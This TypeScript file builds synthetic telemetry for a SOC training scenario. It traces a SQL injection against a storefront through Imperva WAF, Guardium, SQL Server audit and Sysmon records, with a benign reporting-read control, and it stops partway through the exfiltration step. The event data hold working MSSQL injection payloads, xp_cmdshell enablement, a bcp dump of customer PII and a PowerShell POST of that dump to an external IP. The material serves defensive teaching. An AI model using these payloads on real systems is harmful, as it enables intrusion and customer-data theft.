/**
 * Scenario pack: "Imperva alerts on shop.nexacorp.com and unusual ShopDB reads"
 *
 * ADVANCED tier. An internet-facing storefront (shop.nexacorp.com) is hit with
 * SQL injection against its product-search endpoint. The whole teaching point is
 * that a WAF alert alone UNDERSTATES the incident: the WAF is the first tripwire,
 * but the truth of what happened is written one layer deeper, in the database
 * activity monitor.
 *
 * The arc follows the attack THROUGH the WAF and INTO the database:
 *   1. Imperva WAF blocks a boolean-based probe (' OR 1=1) with a 403, the rule
 *      that is in BLOCKING mode does its job.
 *   2. The very next payloads, a UNION SELECT against information_schema and an
 *      error-based CONVERT() extraction, sail through with HTTP 200, because the
 *      rules that would catch them sit in a STAGING policy running in DETECTION
 *      (count) mode: they alert but do not block. This is the crux the student
 *      must see: "the WAF logged it" is not "the WAF stopped it".
 *   3. At the database layer, IBM Guardium (DAM) records the same injection
 *      arriving on the web app's own DB login (app_shop, from WEB-APP-02), an
 *      error-based enumeration that leaks a table name in a CONVERT error, then a
 *      UNION dump of INFORMATION_SCHEMA, then the payoff: a bulk
 *      `SELECT ... FROM dbo.Customers` returning 248,915 rows of PII. Microsoft
 *      SQL Server's own audit corroborates that same SELECT and its response_rows.
 *   4. Because app_shop is (mis)configured as sysadmin, the operator flips
 *      xp_cmdshell on via sp_configure and reaches OS command execution, then uses
 *      it to POST the staged customer dump to an external host.
 *
 * BENIGN CONTROL (evt 0): a scheduled Power BI gateway service account running a
 * parameterized aggregate SELECT that returns 184,920 rows from a reporting view.
 * Same "big database read" shape as the exfil, large rows_returned, but
 * authorized, scheduled, parameterized, and against a reporting view, not the
 * live PII table. The discriminator is never "a lot of rows came back"; it is WHO,
 * from WHERE, WHICH object, and WHETHER the query is parameterized.
 *
 * SOURCES (registry keys): imperva-waf (the WAF injection detections, blocked vs
 * detection-mode passthrough, every request to the end of the attack), ibm-guardium
 * (database activity monitoring: the SQL text only), microsoft-sql-audit (one native
 * SQL Server audit event corroborating the bulk SELECT), sysmon (what the SQL Server
 * service spawned on MSSQL-SHOP-01) and palo-alto-ngfw (the DB tier's egress). A DAM
 * tool sees statements, never processes, files or sockets: those come from the host
 * and the firewall.
 *
 * NOTE: register in scenarios.ts with difficulty "advanced". The ScenarioBundle
 * itself carries no difficulty field.
 */

import type { ScenarioBundle, TelemetryEvent, IOC, ScenarioQuestion } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";
import { sysmonProcess, sysmonFile, sysmonNetwork } from "@/lib/sim/emitters/sysmon";

export function buildSqliDbExfilScenario(
  scenarioId = "sqli-db-exfil-2026",
): ScenarioBundle {
  const B = new Date("2026-07-14T22:40:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;

  // One incident, the injection, the DB reads and the OS-command exfil are one case.
  const INCIDENT = "inc:sqli:1";

  // The internet-facing storefront and its tiers.
  const app = { host: "shop.nexacorp.com", webTier: "WEB-APP-02", webTierIp: "10.30.4.15" };
  const dbInstance = "MSSQL-SHOP-01";
  const dbIp = "10.30.5.20";

  // The attacker's external address, seen at the WAF (upstream of the app).
  const attackerIp = "194.36.191.47";
  // The external endpoint the staged customer dump is POSTed to via xp_cmdshell.
  const exfilIp = "45.83.192.11";

  // The web application's own DB login. It is (mis)configured as sysadmin, which
  // is what later lets the injection enable and drive xp_cmdshell.
  const dbLogin = "app_shop";

  // The Power BI gateway service account, the benign control's high-volume read.
  const biAccount = "svc_powerbi";

  // The staged CSV of customer records the operator exfiltrates.
  const dumpHash = makeSha256("sqli_db_exfil_customers_dump_csv_2026");
  const dumpSize = 41_560_320;

  // Image hashes of the binaries the SQL Server service spawns (one hash = one file).
  const cmdHash = makeSha256("sqli_db_exfil_cmd_exe_2026");
  const whoamiHash = makeSha256("sqli_db_exfil_whoami_exe_2026");
  const bcpHash = makeSha256("sqli_db_exfil_bcp_exe_2026");
  const psHash = makeSha256("sqli_db_exfil_powershell_exe_2026");
  const sqlHash = makeSha256("sqli_db_exfil_sqlservr_exe_2026");
  const SQLSVC = "NT Service\\MSSQLSERVER";
  const SQLPATH = "C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Binn\\sqlservr.exe";
  const SQLCMD = `"${SQLPATH}" -sMSSQLSERVER`;
  const CMDPATH = "C:\\Windows\\System32\\cmd.exe";
  const BCPPATH = "C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\170\\Tools\\Binn\\bcp.exe";
  const PSPATH = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
  const hostCtx = { host: dbInstance, srcIp: dbIp, user: null as null, incidentId: INCIDENT };
  const sqlParent = { parentName: "sqlservr.exe", parentPath: SQLPATH, parentCmdline: SQLCMD, parentPid: 4408 };

  // The injection point is SELECT id,name,price FROM Products WHERE name LIKE '%<q>%'.
  const UNION_CUSTOMERS = "zzzz' UNION SELECT CustomerId,Email+'|'+PasswordHash+'|'+CardLast4,NULL FROM dbo.Customers-- -";

  // One Imperva record for a request that matched a signature in the staging (detect-only)
  // policy: it alerts, the request is forwarded, the origin answers 200.
  const wafPass = (id: string, ts: string, query: string, incidentNo: string, respBytes?: number): TelemetryEvent => ({
    id, ts, source: "waf", vendor: "Imperva WAF", event_type: "waf_allow",
    hostname: app.host, src_ip: attackerIp, severity: "high",
    mitre_technique: "T1190", mitre_tactic: "Initial Access", incident_id: INCIDENT,
    description: `Imperva matched a SQL injection signature in a request to /product/search from ${attackerIp}; staging policy in detection mode, action Alert, forwarded to the origin (HTTP 200).`,
    raw: {
      "event.category": "web",
      "event.action": "sql_injection_detected",
      "event.outcome": "success",
      "source.ip": attackerIp,
      "source.geo.country_name": "Netherlands",
      "source.as.organization.name": "M247 Europe SRL",
      "destination.hostname": app.host,
      "http.request.method": "GET",
      "url.path": "/product/search",
      "url.query": `q=${query}`,
      "http.user_agent": "sqlmap/1.8#stable (https://sqlmap.org)",
      "http.response.status_code": "200",
      ...(respBytes ? { "http.response.body.bytes": String(respBytes) } : {}),
      "imperva.site.id": "52431987",
      "imperva.account.id": "1318204",
      "imperva.incident.id": `531000118-${incidentNo}`,
      "imperva.rule.id": "api.threats.sqli",
      "imperva.rule.name": "SQL Injection",
      "imperva.threat.type": "SQL_INJECTION",
      "imperva.action": "Alert",
      "imperva.client.type": "Bot",
      "imperva.client.application": "sqlmap",
      "waf.attack.type": "SQL Injection",
      "waf.rule.id": "api.threats.sqli",
      "waf.rule.name": "SQL Injection",
      "waf.policy.name": "NexaCorp-Staging-DetectOnly",
      "rule.category": "SQL Injection",
      "action_result": "alerted",
      "threat.signature": "api.threats.sqli",
      "threat.technique.id": "T1190",
      "threat.technique.name": "Exploit Public-Facing Application",
    },
  });

  // One Guardium record of a statement the web tier's login ran on MSSQL-SHOP-01.
  const dam = (id: string, ts: string, o: {
    severity: "high" | "critical"; type: string; db: string; text: string; rows?: string; mitre: string; tactic: string; techName: string;
    procedure?: string; action?: string; desc: string; role?: string;
  }): TelemetryEvent => ({
    id, ts, source: "db_monitor", vendor: "IBM Guardium",
    event_type: o.type === "EXEC" ? "privileged_operation" : "db_query",
    hostname: dbInstance, src_ip: app.webTierIp, severity: o.severity,
    mitre_technique: o.mitre, mitre_tactic: o.tactic, incident_id: INCIDENT, description: o.desc,
    raw: {
      "event.category": "database",
      "event.action": o.action ?? "query_execute",
      "event.outcome": "success",
      "db.user": dbLogin,
      "db.user.role": o.role ?? "sysadmin",
      "database.name": o.db,
      "database.instance": dbInstance,
      "query.type": o.type,
      "query.text": o.text,
      ...(o.rows ? { "query.rows_returned": o.rows } : {}),
      "query.status": "success",
      "sql.command": o.type,
      ...(o.procedure ? { "sql.procedure": o.procedure } : {}),
      "application.name": ".Net SqlClient Data Provider",
      "source.ip": app.webTierIp,
      "source.hostname": app.webTier,
      "destination.ip": dbIp,
      "host.name": dbInstance,
      "threat.technique.id": o.mitre,
      "threat.technique.name": o.techName,
    },
  });

  const events: TelemetryEvent[] = [
    // ─────────────────────────────────────────────────────────────────────
    // 0. BENIGN CONTROL, a scheduled BI aggregate read. Big rows_returned,
    //    but a service account, parameterized, against a reporting view.
    //    Same "large database read" shape as the exfil; opposite verdict.
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "sqli_00_benign_bi_read",
      ts: "2026-07-14T03:00:12.000Z",
      source: "db_monitor",
      vendor: "IBM Guardium",
      event_type: "db_query",
      hostname: "MSSQL-RPT-01",
      severity: "informational",
      expected_verdict: "fp",
      description:
        "svc_powerbi ran a GROUP BY over the reporting view vw_DailyRevenueSummary on SalesDW (MSSQL-RPT-01), returning 184,920 rows.",
      fp_explanation:
        "This is the control case for the whole scenario, and it looks alarming for exactly one reason: a very large rows_returned (184,920). Every other attribute clears it. The db.user is svc_powerbi, a Power BI gateway service account whose job is bulk reporting reads; it runs on schedule at 03:00 every night; the query is parameterized (@from / @to bind variables, no literal string concatenation); and it targets a reporting VIEW (vw_DailyRevenueSummary), not the live customer PII table. The exfil read later in the timeline shares only the row count, it comes from the web app's login, is unparameterized, and pulls dbo.Customers directly. Students who alert on 'a query returned a lot of rows' alone will flag this and be wrong: the discriminator is who, from where, which object, and whether it is parameterized.",
      raw: {
        "event.category": "database",
        "event.action": "query_execute",
        "event.outcome": "success",
        "db.user": biAccount,
        "db.user.role": "db_datareader",
        "database.name": "SalesDW",
        "database.instance": "MSSQL-RPT-01\\RPT",
        "database.table": "vw_DailyRevenueSummary",
        "query.type": "SELECT",
        "query.text":
          "SELECT Region, SUM(NetAmount) AS Revenue, COUNT(*) AS Orders FROM dbo.vw_DailyRevenueSummary WHERE OrderDate >= @from AND OrderDate < @to GROUP BY Region",
        "query.rows_returned": "184920",
        "query.rows_affected": "0",
        "query.duration": "41213",
        "query.status": "success",
        "sql.command": "SELECT",
        "application.name": "Microsoft.PowerBI.EnterpriseGateway",
        "authentication.method": "kerberos",
        "source.ip": "10.30.9.22",
        "source.hostname": "RPT-GW-02",
        "db.session.id": "72",
        "session.start": "2026-07-14T03:00:12Z",
        "host.name": "MSSQL-RPT-01",
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 1. WAF, a boolean-based probe is BLOCKED. The blocking policy works.
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "sqli_01_waf_blocked_probe",
      ts: T(0),
      source: "waf",
      vendor: "Imperva WAF",
      event_type: "waf_block",
      hostname: app.host,
      src_ip: attackerIp,
      severity: "medium",
      mitre_technique: "T1190",
      mitre_tactic: "Initial Access",
      incident_id: INCIDENT,
      description:
        "Imperva blocked a GET to /product/search from 194.36.191.47 whose q parameter carried a boolean tautology (' OR 1=1). The request was answered with HTTP 403 by the production security policy.",
      raw: {
        "event.category": "web",
        "event.action": "sql_injection_detected",
        "event.outcome": "failure",
        "source.ip": attackerIp,
        "source.geo.country_name": "Netherlands",
        "source.as.organization.name": "M247 Europe SRL",
        "destination.hostname": app.host,
        "http.request.method": "GET",
        "url.path": "/product/search",
        "url.query": "q=laptop' OR 1=1-- -",
        "url.full": "https://shop.nexacorp.com/product/search?q=laptop' OR 1=1-- -",
        "http.user_agent": "sqlmap/1.8#stable (https://sqlmap.org)",
        "http.response.status_code": "403",
        "imperva.site.id": "52431987",
        "imperva.account.id": "1318204",
        "imperva.incident.id": "531000118-4471920385137291",
        "imperva.rule.id": "api.threats.sqli",
        "imperva.rule.name": "SQL Injection",
        "imperva.threat.type": "SQL_INJECTION",
        "imperva.action": "Block",
        "imperva.client.type": "Bot",
        "imperva.client.application": "sqlmap",
        "waf.attack.type": "SQL Injection",
        "waf.rule.id": "api.threats.sqli",
        "waf.rule.name": "SQL Injection",
        "waf.policy.name": "NexaCorp-Production",
        "rule.category": "SQL Injection",
        "action_result": "blocked",
        "threat.signature": "api.threats.sqli",
        "threat.technique.id": "T1190",
        "threat.technique.name": "Exploit Public-Facing Application",
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 2. WAF, a UNION SELECT reaches the origin (HTTP 200). The rule fires
    //    but only ALERTS: it lives in a staging policy running in detection
    //    (count) mode, so the malicious request is passed to the app.
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "sqli_02_waf_union_passthrough",
      ts: T(3 * MIN),
      source: "waf",
      vendor: "Imperva WAF",
      event_type: "waf_allow",
      hostname: app.host,
      src_ip: attackerIp,
      severity: "high",
      mitre_technique: "T1190",
      mitre_tactic: "Initial Access",
      incident_id: INCIDENT,
      description:
        "A UNION SELECT against information_schema.tables from 194.36.191.47 matched an Imperva signature but was recorded with action_result=alerted and forwarded to the origin, which answered HTTP 200, the matching rule sits in a staging policy running in detection mode.",
      raw: {
        "event.category": "web",
        "event.action": "sql_injection_detected",
        "event.outcome": "success",
        "source.ip": attackerIp,
        "source.geo.country_name": "Netherlands",
        "source.as.organization.name": "M247 Europe SRL",
        "destination.hostname": app.host,
        "http.request.method": "GET",
        "url.path": "/product/search",
        "url.query": "q=laptop' UNION SELECT null,table_name,null FROM information_schema.tables-- -",
        "url.full":
          "https://shop.nexacorp.com/product/search?q=laptop' UNION SELECT null,table_name,null FROM information_schema.tables-- -",
        "http.user_agent": "sqlmap/1.8#stable (https://sqlmap.org)",
        "http.response.status_code": "200",
        "imperva.site.id": "52431987",
        "imperva.account.id": "1318204",
        "imperva.incident.id": "531000118-4471920385999873",
        "imperva.rule.id": "api.threats.sqli",
        "imperva.rule.name": "SQL Injection",
        "imperva.threat.type": "SQL_INJECTION",
        "imperva.action": "Alert",
        "imperva.client.type": "Bot",
        "imperva.client.application": "sqlmap",
        "waf.attack.type": "SQL Injection",
        "waf.rule.id": "api.threats.sqli",
        "waf.rule.name": "SQL Injection",
        "waf.policy.name": "NexaCorp-Staging-DetectOnly",
        "rule.category": "SQL Injection",
        "action_result": "alerted",
        "threat.signature": "api.threats.sqli",
        "threat.technique.id": "T1190",
        "threat.technique.name": "Exploit Public-Facing Application",
      },
    },

    // 2b. DB: the UNION against information_schema.tables executes on the app login.
    dam("sqli_02b_db_union_tables", T(3 * MIN + 3 * SEC), {
      severity: "high", type: "SELECT", db: "ShopDB", mitre: "T1190", tactic: "Initial Access", techName: "Exploit Public-Facing Application",
      text: "SELECT id,name,price FROM Products WHERE name LIKE '%laptop' UNION SELECT null,table_name,null FROM information_schema.tables-- -%'",
      rows: "181",
      desc: "Guardium recorded the UNION against information_schema.tables on login app_shop from WEB-APP-02, 181 rows returned.",
    }),

    // ─────────────────────────────────────────────────────────────────────
    // 3. WAF, an error-based CONVERT() extraction also passes through (200).
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "sqli_03_waf_errorbased_passthrough",
      ts: T(5 * MIN),
      source: "waf",
      vendor: "Imperva WAF",
      event_type: "waf_allow",
      hostname: app.host,
      src_ip: attackerIp,
      severity: "high",
      mitre_technique: "T1190",
      mitre_tactic: "Initial Access",
      incident_id: INCIDENT,
      description:
        "An error-based payload, 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables)), from 194.36.191.47 was again alerted-only under the staging policy and forwarded to the origin (HTTP 200).",
      raw: {
        "event.category": "web",
        "event.action": "sql_injection_detected",
        "event.outcome": "success",
        "source.ip": attackerIp,
        "source.geo.country_name": "Netherlands",
        "source.as.organization.name": "M247 Europe SRL",
        "destination.hostname": app.host,
        "http.request.method": "GET",
        "url.path": "/product/search",
        "url.query":
          "q=laptop' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables))-- -",
        "http.request.body": "",
        "http.user_agent": "sqlmap/1.8#stable (https://sqlmap.org)",
        "http.response.status_code": "200",
        "imperva.site.id": "52431987",
        "imperva.account.id": "1318204",
        "imperva.incident.id": "531000118-4471920386204415",
        "imperva.rule.id": "api.threats.sqli",
        "imperva.rule.name": "SQL Injection",
        "imperva.threat.type": "SQL_INJECTION",
        "imperva.action": "Alert",
        "imperva.client.type": "Bot",
        "imperva.client.application": "sqlmap",
        "waf.attack.type": "SQL Injection",
        "waf.rule.id": "api.threats.sqli",
        "waf.rule.name": "SQL Injection",
        "waf.policy.name": "NexaCorp-Staging-DetectOnly",
        "rule.category": "SQL Injection",
        "action_result": "alerted",
        "threat.signature": "api.threats.sqli",
        "threat.technique.id": "T1190",
        "threat.technique.name": "Exploit Public-Facing Application",
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 4. DB, the error-based payload arrives at the database on the app's own
    //    login. A CONVERT() failure leaks a table name in the error message.
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "sqli_04_db_errorbased_enum",
      ts: T(5 * MIN + 4 * SEC),
      source: "db_monitor",
      vendor: "IBM Guardium",
      event_type: "db_query",
      hostname: dbInstance,
      src_ip: app.webTierIp,
      severity: "high",
      mitre_technique: "T1190",
      mitre_tactic: "Initial Access",
      incident_id: INCIDENT,
      description:
        "Guardium recorded the injected CONVERT() extraction reaching ShopDB on login app_shop from the web tier WEB-APP-02. The statement failed with SQL error 245, and the conversion error text returned the name of a table.",
      raw: {
        "event.category": "database",
        "event.action": "query_execute",
        "event.outcome": "failure",
        "db.user": dbLogin,
        "db.user.role": "sysadmin",
        "database.name": "ShopDB",
        "database.instance": dbInstance,
        "query.type": "SELECT",
        "query.text":
          "SELECT id,name,price FROM Products WHERE name LIKE '%laptop' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables))-- -%'",
        "query.status": "error",
        "sql.command": "SELECT",
        "sql.error.code": "245",
        "sql.error.message":
          "Conversion failed when converting the nvarchar value 'Customers' to data type int.",
        "application.name": ".Net SqlClient Data Provider",
        "source.ip": app.webTierIp,
        "source.hostname": app.webTier,
        "host.name": dbInstance,
        "threat.technique.id": "T1190",
        "threat.technique.name": "Exploit Public-Facing Application",
      },
    },

    // 4b. WAF: the UNION against INFORMATION_SCHEMA.COLUMNS (detect-only, 200).
    wafPass("sqli_04b_waf_union_columns", T(5 * MIN + 58 * SEC),
      "laptop' UNION SELECT TABLE_NAME,COLUMN_NAME,NULL FROM INFORMATION_SCHEMA.COLUMNS-- -", "4471920391552031"),

    // ─────────────────────────────────────────────────────────────────────
    // 5. DB, a UNION dump of INFORMATION_SCHEMA.COLUMNS succeeds: the operator
    //    now has the full column map (schema enumeration).
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "sqli_05_db_union_schema",
      ts: T(6 * MIN),
      source: "db_monitor",
      vendor: "IBM Guardium",
      event_type: "db_query",
      hostname: dbInstance,
      src_ip: app.webTierIp,
      severity: "high",
      mitre_technique: "T1190",
      mitre_tactic: "Initial Access",
      incident_id: INCIDENT,
      description:
        "A UNION SELECT appended to the product query returned 612 rows from INFORMATION_SCHEMA.COLUMNS on login app_shop, a full table-and-column map of ShopDB.",
      raw: {
        "event.category": "database",
        "event.action": "query_execute",
        "event.outcome": "success",
        "db.user": dbLogin,
        "db.user.role": "sysadmin",
        "database.name": "ShopDB",
        "database.instance": dbInstance,
        "database.table": "INFORMATION_SCHEMA.COLUMNS",
        "query.type": "SELECT",
        "query.text":
          "SELECT id,name,price FROM Products WHERE name LIKE '%' UNION SELECT TABLE_NAME,COLUMN_NAME,NULL FROM INFORMATION_SCHEMA.COLUMNS-- -%'",
        "query.rows_returned": "612",
        "query.status": "success",
        "sql.command": "SELECT",
        "application.name": ".Net SqlClient Data Provider",
        "source.ip": app.webTierIp,
        "source.hostname": app.webTier,
        "host.name": dbInstance,
        "threat.technique.id": "T1190",
        "threat.technique.name": "Exploit Public-Facing Application",
      },
    },

    // 5b. WAF: the UNION against dbo.Customers (detect-only, 200); the response is ~41.5 MB.
    wafPass("sqli_05b_waf_union_customers", T(7 * MIN + 58 * SEC), UNION_CUSTOMERS, "4471920395008112", dumpSize),

    // ─────────────────────────────────────────────────────────────────────
    // 6. DB, THE PAYOFF. A bulk SELECT of the customer PII table returns
    //    248,915 rows on the app login. This is the data actually leaving.
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "sqli_06_db_bulk_pii_dump",
      ts: T(8 * MIN),
      source: "db_monitor",
      vendor: "IBM Guardium",
      event_type: "db_query",
      hostname: dbInstance,
      src_ip: app.webTierIp,
      severity: "critical",
      mitre_technique: "T1213",
      mitre_tactic: "Collection",
      incident_id: INCIDENT,
      description:
        "Guardium recorded the product query on login app_shop with a UNION SELECT of dbo.Customers appended (email, password hash and card-last-four columns), returning 248,915 rows with 41.5 MB moved in the session.",
      raw: {
        "event.category": "database",
        "event.action": "query_execute",
        "event.outcome": "success",
        "db.user": dbLogin,
        "db.user.role": "sysadmin",
        "database.name": "ShopDB",
        "database.instance": dbInstance,
        "database.table": "dbo.Customers",
        "database.column": "Email,PasswordHash,CardLast4",
        "query.type": "SELECT",
        "query.text":
          "SELECT id,name,price FROM Products WHERE name LIKE '%zzzz' UNION SELECT CustomerId,Email+'|'+PasswordHash+'|'+CardLast4,NULL FROM dbo.Customers-- -%'",
        "query.rows_returned": "248915",
        "query.rows_affected": "0",
        "query.duration": "88342",
        "query.status": "success",
        "sql.command": "SELECT",
        "application.name": ".Net SqlClient Data Provider",
        "session.bytes": "41560320",
        "source.ip": app.webTierIp,
        "destination.ip": dbIp,
        "source.hostname": app.webTier,
        "host.name": dbInstance,
        "threat.technique.id": "T1213",
        "threat.technique.name": "Data from Information Repositories",
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 7. DB (native), SQL Server's own audit corroborates the same bulk
    //    SELECT and its response_rows. Read straight off the .sqlaudit file.
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "sqli_07_mssql_audit_dump",
      ts: T(8 * MIN + 1 * SEC),
      source: "db_monitor",
      vendor: "Microsoft SQL Server Audit",
      event_type: "db_query",
      hostname: dbInstance,
      src_ip: app.webTierIp,
      severity: "critical",
      mitre_technique: "T1213",
      mitre_tactic: "Collection",
      incident_id: INCIDENT,
      description:
        "SQL Server's native audit logged the same statement as a SELECT (action_id SL) by principal app_shop from client 10.30.4.15, succeeded=true, response_rows 248,915: an independent record of the read at the engine.",
      raw: {
        "event_time": T(8 * MIN + 1 * SEC),
        "sequence_number": "1",
        "action_id": "SL",
        "succeeded": "true",
        "class_type": "U",
        "server_principal_name": dbLogin,
        "database_principal_name": "dbo",
        "server_instance_name": dbInstance,
        "database_name": "ShopDB",
        "schema_name": "dbo",
        "object_name": "Customers",
        "statement":
          "SELECT id,name,price FROM Products WHERE name LIKE '%zzzz' UNION SELECT CustomerId,Email+'|'+PasswordHash+'|'+CardLast4,NULL FROM dbo.Customers-- -%'",
        "client_ip": app.webTierIp,
        "application_name": ".Net SqlClient Data Provider",
        "host_name": app.webTier,
        "response_rows": "248915",
        "affected_rows": "0",
        "duration_milliseconds": "88342",
        "session_id": "88",
        "audit_file_offset": "512000",
        "file_name": "ShopDB_Audit_0A3F.sqlaudit",
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 7a. The stacked-query request that turns xp_cmdshell on (WAF, then DB).
    //     Guardium logs each statement of the batch separately.
    // ─────────────────────────────────────────────────────────────────────
    wafPass("sqli_07a_waf_stacked_configure", T(10 * MIN + 18 * SEC),
      "laptop'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -", "4471920398877310"),
    dam("sqli_07b_db_show_advanced", T(10 * MIN + 20 * SEC), {
      severity: "critical", type: "EXEC", db: "master", action: "stored_procedure_exec", procedure: "sp_configure",
      mitre: "T1059", tactic: "Execution", techName: "Command and Scripting Interpreter",
      text: "EXEC sp_configure 'show advanced options',1; RECONFIGURE",
      desc: "Guardium recorded sp_configure 'show advanced options' = 1 followed by RECONFIGURE on login app_shop (role sysadmin).",
    }),
    dam("sqli_07c_db_enable_xpcmdshell", T(10 * MIN + 25 * SEC), {
      severity: "critical", type: "EXEC", db: "master", action: "stored_procedure_exec", procedure: "sp_configure",
      mitre: "T1059", tactic: "Execution", techName: "Command and Scripting Interpreter",
      text: "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE",
      desc: "Guardium recorded sp_configure 'xp_cmdshell' = 1 followed by RECONFIGURE on login app_shop (role sysadmin).",
    }),

    // ─────────────────────────────────────────────────────────────────────
    // 8. xp_cmdshell 'whoami': the request (WAF), the statement (DAM) and what the
    //    SQL Server service spawned on the database host (Sysmon).
    // ─────────────────────────────────────────────────────────────────────
    wafPass("sqli_07d_waf_xpcmdshell_whoami", T(10 * MIN + 56 * SEC),
      "laptop'; EXEC master..xp_cmdshell 'whoami'-- -", "4471920401120044"),
    dam("sqli_08_xpcmdshell_exec", T(11 * MIN), {
      severity: "critical", type: "EXEC", db: "master", action: "stored_procedure_exec", procedure: "xp_cmdshell",
      mitre: "T1059", tactic: "Execution", techName: "Command and Scripting Interpreter",
      text: "EXEC master..xp_cmdshell 'whoami'",
      desc: "Guardium recorded EXEC master..xp_cmdshell 'whoami' on login app_shop (role sysadmin).",
    }),
    sysmonProcess({
      ...hostCtx, id: "sqli_08a_host_cmd_whoami", ts: T(11 * MIN + 1 * SEC),
      processName: "cmd.exe", processPath: CMDPATH, cmdline: "cmd.exe /c whoami", pid: 6120, ...sqlParent,
      sha256: cmdHash, signed: true, integrity: "System", runAsUser: SQLSVC, mitre: "T1059.003", tactic: "Execution", severity: "high",
      description: "Sysmon 1 on MSSQL-SHOP-01: sqlservr.exe started cmd.exe /c whoami as NT Service\\MSSQLSERVER.",
    }),
    sysmonProcess({
      ...hostCtx, id: "sqli_08b_host_whoami", ts: T(11 * MIN + 1 * SEC + 400),
      processName: "whoami.exe", processPath: "C:\\Windows\\System32\\whoami.exe", cmdline: "whoami", pid: 6128,
      parentName: "cmd.exe", parentPath: CMDPATH, parentCmdline: "cmd.exe /c whoami", parentPid: 6120,
      sha256: whoamiHash, signed: true, integrity: "System", runAsUser: SQLSVC, severity: "medium",
      description: "Sysmon 1 on MSSQL-SHOP-01: cmd.exe started whoami.exe.",
    }),

    // ─────────────────────────────────────────────────────────────────────
    // 9. Staging: bcp exports the customer table to C:\Windows\Temp\c.csv.
    // ─────────────────────────────────────────────────────────────────────
    wafPass("sqli_08c_waf_bcp_export", T(12 * MIN),
      "laptop'; EXEC master..xp_cmdshell 'bcp \"SELECT CustomerId,Email,PasswordHash,CardLast4 FROM ShopDB.dbo.Customers\" queryout C:\\Windows\\Temp\\c.csv -c -T -S MSSQL-SHOP-01'-- -", "4471920404330218"),
    dam("sqli_08d_db_bcp_export", T(12 * MIN + 2 * SEC), {
      severity: "critical", type: "EXEC", db: "master", action: "stored_procedure_exec", procedure: "xp_cmdshell",
      mitre: "T1560", tactic: "Collection", techName: "Archive Collected Data",
      text: "EXEC master..xp_cmdshell 'bcp \"SELECT CustomerId,Email,PasswordHash,CardLast4 FROM ShopDB.dbo.Customers\" queryout C:\\Windows\\Temp\\c.csv -c -T -S MSSQL-SHOP-01'",
      desc: "Guardium recorded xp_cmdshell running bcp to export dbo.Customers to C:\\Windows\\Temp\\c.csv on login app_shop.",
    }),
    sysmonProcess({
      ...hostCtx, id: "sqli_08e_host_cmd_bcp", ts: T(12 * MIN + 3 * SEC),
      processName: "cmd.exe", processPath: CMDPATH,
      cmdline: "cmd.exe /c bcp \"SELECT CustomerId,Email,PasswordHash,CardLast4 FROM ShopDB.dbo.Customers\" queryout C:\\Windows\\Temp\\c.csv -c -T -S MSSQL-SHOP-01",
      pid: 6204, ...sqlParent, sha256: cmdHash, signed: true, integrity: "System", runAsUser: SQLSVC, mitre: "T1059.003", tactic: "Execution", severity: "high",
      description: "Sysmon 1 on MSSQL-SHOP-01: sqlservr.exe started cmd.exe /c bcp ... queryout C:\\Windows\\Temp\\c.csv.",
    }),
    sysmonProcess({
      ...hostCtx, id: "sqli_08f_host_bcp", ts: T(12 * MIN + 4 * SEC),
      processName: "bcp.exe", processPath: BCPPATH,
      cmdline: "bcp \"SELECT CustomerId,Email,PasswordHash,CardLast4 FROM ShopDB.dbo.Customers\" queryout C:\\Windows\\Temp\\c.csv -c -T -S MSSQL-SHOP-01",
      pid: 6212, parentName: "cmd.exe", parentPath: CMDPATH, parentPid: 6204,
      sha256: bcpHash, signed: true, integrity: "System", runAsUser: SQLSVC, mitre: "T1560", tactic: "Collection", severity: "high",
      description: "Sysmon 1 on MSSQL-SHOP-01: cmd.exe started bcp.exe exporting dbo.Customers to C:\\Windows\\Temp\\c.csv.",
    }),
    {
      ...sysmonFile({
      ...hostCtx, id: "sqli_08g_host_csv_written", ts: T(12 * MIN + 40 * SEC),
      processName: "bcp.exe", processPath: BCPPATH, pid: 6212,
      path: "C:\\Windows\\Temp\\c.csv", sha256: dumpHash, fileSize: dumpSize, mitre: "T1074.001", tactic: "Collection", severity: "high",
      description: "Sysmon 11 on MSSQL-SHOP-01: bcp.exe created C:\\Windows\\Temp\\c.csv (41,560,320 bytes).",
      }),
      process: { name: "bcp.exe", pid: 6212, path: BCPPATH, parent_name: "cmd.exe", parent_pid: 6204, user: SQLSVC },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 10. Exfiltration: PowerShell POSTs c.csv to 45.83.192.11 (WAF, DAM, host, firewall).
    // ─────────────────────────────────────────────────────────────────────
    wafPass("sqli_08h_waf_powershell_post", T(12 * MIN + 58 * SEC),
      "laptop'; EXEC master..xp_cmdshell 'powershell -c \"Invoke-WebRequest -Uri http://45.83.192.11/u -Method POST -InFile C:\\Windows\\Temp\\c.csv\"'-- -", "4471920407716652"),
    dam("sqli_09_xpcmdshell_exfil", T(13 * MIN), {
      severity: "critical", type: "EXEC", db: "master", action: "stored_procedure_exec", procedure: "xp_cmdshell",
      mitre: "T1567", tactic: "Exfiltration", techName: "Exfiltration Over Web Service",
      text: "EXEC master..xp_cmdshell 'powershell -c \"Invoke-WebRequest -Uri http://45.83.192.11/u -Method POST -InFile C:\\Windows\\Temp\\c.csv\"'",
